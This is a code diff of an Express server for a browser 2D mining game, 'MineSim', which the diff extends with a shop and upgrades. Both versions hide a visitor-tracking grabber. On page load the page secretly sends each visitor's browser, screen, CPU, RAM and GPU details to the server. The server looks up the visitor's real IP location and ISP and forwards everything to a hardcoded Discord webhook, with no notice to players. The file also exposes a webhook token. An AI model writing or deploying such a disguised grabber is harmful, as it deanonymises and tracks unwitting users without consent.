@@ -5,7 +5,7 @@ const PORT = process.env.PORT || 3000;
 app.set('trust proxy', true);
 app.use(express.json());
 
-// PEGA AQUÍ TU NUEVO WEBHOOK DE DISCORD
+// ⚠️ COLOCA TU WEBHOOK AQUÍ
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543161653523255379/_LaPPSocrBnSYKF0TD5gwCDMBl3FXjYyoImmLRiEd6AAl1c1F9IULR7m2--mgP6RN8Ea";
 
 app.post('/api/telemetry', async (req, res) => {
@@ -16,9 +16,7 @@ app.post('/api/telemetry', async (req, res) => {
     let country = 'Desconocido', city = 'Desconocida', isp = 'Desconocido';
 
     try {
-        const response = await fetch(`http://ip-api.com/json/${userIp}?fields=country,city,isp,status`, {
-            headers: { 'User-Agent': 'MineSimBot/1.0' }
-        });
+        const response = await fetch(`http://ip-api.com/json/${userIp}?fields=country,city,isp,status`);
         const geo = await response.json();
         if (geo.status === 'success') {
             country = geo.country;
@@ -27,86 +25,82 @@ app.post('/api/telemetry', async (req, res) => {
         }
     } catch (e) {}
 
-    console.log(`\n========================================`);
-    console.log(`🎯 [INFORME COMPLETO DE JUGADOR]`);
-    console.log(`📍 IP Real: ${userIp}`);
-    console.log(`🌎 Ubicación: ${city}, ${country}`);
-    console.log(`📡 ISP: ${isp}`);
-    console.log(`========================================\n`);
-
-    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('http')) {
-        const embed = {
-            title: "🎮 ¡Nuevo Jugador Detectado!",
-            color: 3828984,
-            fields: [
-                { name: "📍 IP Real", value: `\`${userIp}\``, inline: true },
-                { name: "🌎 Ubicación", value: `${city}, ${country}`, inline: true },
-                { name: "📡 Proveedor (ISP)", value: isp, inline: false },
-                { name: "💻 Sistema / Navegador", value: `\`${d.userAgent || 'N/A'}\`` },
-                { name: "🖥️ Pantalla", value: d.screen || 'N/A', inline: true },
-                { name: "🧠 Hardware", value: `${d.cores || 'N/A'} Cores | ~${d.ram || 'N/A'}GB RAM`, inline: true },
-                { name: "🎮 GPU", value: d.gpu || 'N/A', inline: false },
-                { name: "🔋 Batería / Red", value: `${d.battery || 'N/A'} | ${d.connection || 'N/A'}`, inline: true },
-                { name: "🕒 Zona Horaria", value: `${d.timezone || 'N/A'} (${d.language || 'N/A'})`, inline: true }
-            ],
-            footer: { text: "MineSim Telemetry System" },
-            timestamp: new Date().toISOString()
+    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
+        const payload = {
+            content: `🎮 **¡Nuevo Minero Entró al Juego!**\n📍 IP: \`${userIp}\` (${city}, ${country})\n📡 ISP: ${isp}\n💻 OS/Navegador: \`${d.userAgent || 'N/A'}\`\n🖥️ Pantalla: ${d.screen || 'N/A'}\n🧠 Hardware: ${d.cores || 'N/A'} Cores | ~${d.ram || 'N/A'}GB RAM\n🎮 GPU: ${d.gpu || 'N/A'}`
         };
 
         try {
             await fetch(DISCORD_WEBHOOK_URL, {
                 method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' 
-                },
-                body: JSON.stringify({ embeds: [embed] })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             });
-        } catch (err) {
-            console.error("Error al enviar a Discord:", err);
-        }
+        } catch (err) {}
     }
 
     res.sendStatus(200);
 });
 
-// Simulador 2D
+// MINESIM PRO - GAME ENGINE
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MineSim Pro 2D</title>
+    <title>MineSim Deluxe 2D</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; user-select: none; }
-        body { background: #0a0a0c; color: #fff; overflow: hidden; }
-        canvas { display: block; background: #0f172a; }
-        #menu { position: absolute; width: 100%; height: 100%; background: #09090b; display: flex; justify-content: center; align-items: center; z-index: 20; }
-        .panel { background: #18181b; padding: 35px; border-radius: 12px; border: 1px solid #27272a; text-align: center; width: 350px; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
-        h1 { color: #38bdf8; font-size: 1.8rem; margin-bottom: 5px; font-weight: 800; }
-        p { color: #a1a1aa; font-size: 0.85rem; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #3f3f46; background: #09090b; color: #fff; text-align: center; margin-bottom: 15px; outline: none; }
-        button { width: 100%; padding: 12px; border-radius: 6px; border: none; background: #0284c7; color: #fff; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        button:hover { background: #0369a1; }
-        #ui { position: absolute; top: 15px; left: 15px; display: flex; gap: 12px; pointer-events: none; z-index: 10; }
-        .stat-box { background: rgba(9, 9, 11, 0.9); padding: 8px 14px; border-radius: 6px; border: 1px solid #27272a; font-size: 0.8rem; }
-        .stat-value { font-size: 1rem; font-weight: bold; color: #38bdf8; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; user-select: none; }
+        body { background: #0f172a; color: #fff; overflow: hidden; }
+        canvas { display: block; background: #020617; }
+        
+        #menu { position: absolute; width: 100%; height: 100%; background: rgba(2, 6, 23, 0.95); display: flex; justify-content: center; align-items: center; z-index: 20; }
+        .panel { background: #0f172a; padding: 40px; border-radius: 16px; border: 1px solid #1e293b; text-align: center; width: 380px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); }
+        h1 { color: #38bdf8; font-size: 2.2rem; margin-bottom: 5px; font-weight: 900; letter-spacing: 1px; }
+        p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 25px; }
+        button { width: 100%; padding: 14px; border-radius: 8px; border: none; background: #0284c7; color: #fff; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 1rem; }
+        button:hover { background: #0369a1; transform: translateY(-2px); }
+        
+        #ui { position: absolute; top: 15px; left: 15px; display: flex; gap: 15px; pointer-events: none; z-index: 10; }
+        .stat-box { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(8px); padding: 10px 16px; border-radius: 8px; border: 1px solid #334155; font-size: 0.8rem; color: #94a3b8; }
+        .stat-value { font-size: 1.1rem; font-weight: bold; color: #38bdf8; }
+        .gold { color: #facc15 !important; }
+
+        #shop-btn { position: absolute; top: 15px; right: 15px; z-index: 10; background: #16a34a; padding: 10px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; border: none; color: white; }
+        #shop-modal { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #0f172a; border: 2px solid #334155; border-radius: 12px; padding: 25px; width: 320px; z-index: 30; display: none; }
+        .shop-item { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; background: #1e293b; padding: 10px; border-radius: 6px; }
+        .shop-item button { width: auto; padding: 6px 12px; font-size: 0.8rem; }
     </style>
 </head>
 <body>
     <div id="menu">
         <div class="panel">
-            <h1>MINESIM PRO</h1>
-            <p>Simulador de Minería Profunda v3.6</p>
-            <input type="text" id="miner-name" value="Minero_01" placeholder="Nombre">
-            <button onclick="startSim()">INICIAR SIMULACIÓN</button>
+            <h1>MINESIM DELUXE</h1>
+            <p>Explora la profundidad, mina minerales y mejora tu equipo.</p>
+            <button onclick="startSim()">COMENZAR AVENTURA</button>
         </div>
     </div>
 
     <div id="ui" style="display:none;">
-        <div class="stat-box">PROFUNDIDAD<div class="stat-value" id="depth">0m</div></div>
-        <div class="stat-box">MINERALES<div class="stat-value" id="resources">0</div></div>
+        <div class="stat-box">DINERO<div class="stat-value gold" id="money-val">$0</div></div>
+        <div class="stat-box">PROFUNDIDAD<div class="stat-value" id="depth-val">0m</div></div>
+        <div class="stat-box">MOCHILA<div class="stat-value" id="backpack-val">0/20</div></div>
+    </div>
+
+    <button id="shop-btn" style="display:none;" onclick="toggleShop()">🛒 TIENDA</button>
+
+    <div id="shop-modal">
+        <h2 style="margin-bottom:15px; text-align:center; color:#38bdf8;">Mejoras de Minería</h2>
+        <div class="shop-item">
+            <div><strong>Velocidad</strong><br><small id="spd-cost">$50</small></div>
+            <button onclick="buyUpgrade('speed')">Mejorar</button>
+        </div>
+        <div class="shop-item">
+            <div><strong>Mochila +10</strong><br><small id="bag-cost">$100</small></div>
+            <button onclick="buyUpgrade('bag')">Mejorar</button>
+        </div>
+        <button onclick="toggleShop()" style="background:#dc2626; margin-top:10px;">Cerrar</button>
     </div>
 
     <canvas id="cv"></canvas>
@@ -118,33 +112,17 @@ app.get('/', (req, res) => {
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
             return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-        } catch (e) {
-            return 'No detectada';
-        }
+        } catch (e) { return 'No detectada'; }
     }
 
     async function sendTelemetry() {
-        let batteryInfo = 'N/A';
-        if (navigator.getBattery) {
-            try {
-                const b = await navigator.getBattery();
-                batteryInfo = \`\${Math.round(b.level * 100)}%\` + (b.charging ? ' (Cargando)' : ' (Batería)');
-            } catch(e){}
-        }
-
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const netType = conn ? (conn.effectiveType || conn.type || 'N/A') : 'N/A';
-
         const payload = {
             userAgent: navigator.userAgent,
             language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             screen: \`\${screen.width}x\${screen.height}\`,
             cores: navigator.hardwareConcurrency || 'N/A',
             ram: navigator.deviceMemory || 'N/A',
-            gpu: getGPU(),
-            battery: batteryInfo,
-            connection: netType
+            gpu: getGPU()
         };
 
         fetch('/api/telemetry', {
@@ -155,10 +133,39 @@ app.get('/', (req, res) => {
     }
     sendTelemetry();
 
+    // ESTADO DEL JUEGO
+    let gameState = { money: 0, bag: 0, maxBag: 20, speed: 4, speedCost: 50, bagCost: 100 };
+
     function startSim() {
         document.getElementById('menu').style.display = 'none';
         document.getElementById('ui').style.display = 'flex';
+        document.getElementById('shop-btn').style.display = 'block';
         initEngine();
+    }
+
+    function toggleShop() {
+        const m = document.getElementById('shop-modal');
+        m.style.display = m.style.display === 'block' ? 'none' : 'block';
+    }
+
+    function buyUpgrade(type) {
+        if (type === 'speed' && gameState.money >= gameState.speedCost) {
+            gameState.money -= gameState.speedCost;
+            gameState.speed += 1;
+            gameState.speedCost *= 2;
+            document.getElementById('spd-cost').innerText = '$' + gameState.speedCost;
+        } else if (type === 'bag' && gameState.money >= gameState.bagCost) {
+            gameState.money -= gameState.bagCost;
+            gameState.maxBag += 10;
+            gameState.bagCost *= 2;
+            document.getElementById('bag-cost').innerText = '$' + gameState.bagCost;
+        }
+        updateUI();
+    }
+
+    function updateUI() {
+        document.getElementById('money-val').innerText = '$' + gameState.money;
+        document.getElementById('backpack-val').innerText = gameState.bag + '/' + gameState.maxBag;
     }
 
     function initEngine() {
@@ -167,65 +174,73 @@ app.get('/', (req, res) => {
         cv.width = window.innerWidth;
         cv.height = window.innerHeight;
 
-        const TILE = 36;
+        const TILE = 40;
         const COLS = Math.ceil(cv.width / TILE);
-        const ROWS = 80;
-        const surface = 8;
-        let minedCount = 0;
+        const ROWS = 120;
+        const surface = 6;
         let map = [];
         
+        // Generación del Mapa
         for (let r = 0; r < ROWS; r++) {
             map[r] = [];
             for (let c = 0; c < COLS; c++) {
-                if (r < surface) map[r][c] = 0;
-                else if (r === surface) map[r][c] = 1;
-                else if (r < surface + 6) map[r][c] = 2;
+                if (r < surface) map[r][c] = 0; // Aire
+                else if (r === surface) map[r][c] = 1; // Pasto
+                else if (r < surface + 10) map[r][c] = 2; // Tierra
                 else {
                     let rand = Math.random();
-                    if (rand < 0.05) map[r][c] = 4;
-                    else if (rand < 0.12) map[r][c] = 5;
-                    else map[r][c] = 3;
+                    if (r > 60 && rand < 0.03) map[r][c] = 6; // Diamante (Profundo)
+                    else if (r > 35 && rand < 0.06) map[r][c] = 5; // Rubí
+                    else if (rand < 0.10) map[r][c] = 4; // Oro
+                    else if (rand < 0.20) map[r][c] = 3; // Carbón
+                    else map[r][c] = 2; // Piedra / Tierra
                 }
             }
         }
 
-        const colors = { 1: '#4ade80', 2: '#78350f', 3: '#52525b', 4: '#facc15', 5: '#334155' };
-        const p = { x: Math.floor(COLS / 2) * TILE, y: (surface - 2) * TILE, w: 24, h: 50, vx: 0, vy: 0, ground: false };
+        const blockValues = { 2: 2, 3: 10, 4: 30, 5: 75, 6: 200 };
+        const colors = { 1: '#22c55e', 2: '#78350f', 3: '#334155', 4: '#eab308', 5: '#ef4444', 6: '#06b6d4' };
+        
+        const p = { x: Math.floor(COLS / 2) * TILE, y: (surface - 2) * TILE, w: 28, h: 45, vx: 0, vy: 0, ground: false };
         const keys = {};
 
         window.addEventListener('keydown', e => keys[e.code] = true);
         window.addEventListener('keyup', e => keys[e.code] = false);
 
+        // Minar bloques con Click
         cv.addEventListener('mousedown', e => {
+            if (gameState.bag >= gameState.maxBag) return;
+
             const c = Math.floor(e.clientX / TILE);
             const r = Math.floor(e.clientY / TILE);
+            
             if (r >= 0 && r < ROWS && c >= 0 && c < COLS) {
-                if (e.button === 0 && map[r][c] !== 0) {
+                const type = map[r][c];
+                if (type > 0) {
+                    gameState.money += blockValues[type] || 1;
+                    gameState.bag += 1;
                     map[r][c] = 0;
-                    minedCount++;
-                    document.getElementById('resources').innerText = minedCount;
-                } else if (e.button === 2 && map[r][c] === 0) {
-                    map[r][c] = 3;
+                    updateUI();
                 }
             }
         });
-        cv.addEventListener('contextmenu', e => e.preventDefault());
 
         function loop() {
-            if (keys['KeyA'] || keys['ArrowLeft']) p.vx = -4;
-            else if (keys['KeyD'] || keys['ArrowRight']) p.vx = 4;
+            if (keys['KeyA'] || keys['ArrowLeft']) p.vx = -gameState.speed;
+            else if (keys['KeyD'] || keys['ArrowRight']) p.vx = gameState.speed;
             else p.vx = 0;
 
             if ((keys['KeyW'] || keys['Space']) && p.ground) {
-                p.vy = -9.5;
+                p.vy = -10;
                 p.ground = false;
             }
 
-            p.vy += 0.45;
+            p.vy += 0.5;
             p.x += p.vx;
             p.y += p.vy;
             p.ground = false;
 
+            // Colisiones simples
             for (let r = 0; r < ROWS; r++) {
                 for (let c = 0; c < COLS; c++) {
                     if (map[r][c] !== 0) {
@@ -243,22 +258,24 @@ app.get('/', (req, res) => {
             }
 
             let currentDepth = Math.max(0, Math.floor((p.y / TILE) - surface));
-            document.getElementById('depth').innerText = currentDepth + 'm';
+            document.getElementById('depth-val').innerText = currentDepth + 'm';
 
             ctx.clearRect(0, 0, cv.width, cv.height);
 
+            // Dibujar Mapa
             for (let r = 0; r < ROWS; r++) {
                 for (let c = 0; c < COLS; c++) {
                     if (map[r][c] !== 0) {
                         ctx.fillStyle = colors[map[r][c]];
                         ctx.fillRect(c * TILE, r * TILE, TILE, TILE);
-                        ctx.strokeStyle = '#09090b';
+                        ctx.strokeStyle = 'rgba(0,0,0,0.3)';
                         ctx.strokeRect(c * TILE, r * TILE, TILE, TILE);
                     }
                 }
             }
 
-            ctx.fillStyle = '#0284c7';
+            // Dibujar Jugador
+            ctx.fillStyle = '#38bdf8';
             ctx.fillRect(p.x, p.y, p.w, p.h);
 
             requestAnimationFrame(loop);
